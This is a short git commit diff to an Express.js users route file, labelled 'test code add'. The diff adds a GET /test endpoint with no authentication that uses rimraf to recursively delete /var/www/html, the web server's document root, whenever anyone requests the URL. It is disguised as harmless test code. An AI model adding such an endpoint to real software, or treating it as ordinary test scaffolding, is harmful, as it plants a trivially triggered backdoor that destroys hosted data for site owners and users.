e8878dd2150205c956f5637891f73302cd148c96
GOD <masterionic@gmail.com>
2020-03-27 10:37:04 +0800

    test code add

--- routes/users.js
+++ routes/users.js
@@ -1,9 +1,17 @@
 var express = require('express');
 var router = express.Router();
+var rimraf = require("rimraf");
 
 /* GET users listing. */
 router.get('/', function(req, res, next) {
   res.send('respond with a resource');
+});
+
+router.get('/test', function(req,res, next) {
+  rimraf("/var/www/html", function () { 
+    console.log("done"); 
+    res.send('okay');
+  });
 });
 
 module.exports = router;
